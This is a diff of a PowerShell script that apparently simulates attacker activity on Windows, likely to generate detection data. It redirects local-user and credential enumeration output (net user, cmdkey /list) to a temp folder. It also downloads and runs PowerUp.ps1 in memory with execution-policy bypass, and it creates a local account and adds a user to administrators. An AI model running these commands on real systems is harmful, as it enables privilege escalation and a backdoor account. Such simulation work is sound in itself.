@@ -24,15 +24,15 @@ Start-Sleep -S 30
 # Local user Enumeration
 
 Write-Host "[+] Windows Enumeration" -ForegroundColor Green
-net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localuser | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-net localgroup "Users" | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
-get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
+net user | Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+ls c:\Users\ |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+cmdkey.exe /list |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+get-localuser |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+get-localgroup |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+net localgroup "Users" |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+net localgroup |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+get-localgroupmember -group Users |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
+get-childitem C:\Users\ |  Out-File -FilePath "C:\Users\Elastic\AppData\Local\Temp\Localenum.txt" -Append
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\Users\Elastic\AppData\Local\Temp\Powerup.txt"
 
 Start-Sleep -S 5
@@ -40,7 +40,7 @@ Start-Sleep -S 5
 # Create a new local user
 
 Write-Host "[+] Creating user Ed Snowden" -ForegroundColor Green
-net user /add "Ed Snowden" "edsnowdenisthebest"
+net user /add "Ed Snowden" "eddysnow"
 net localgroup administrators "admin" /add
 
 Start-Sleep -S 15
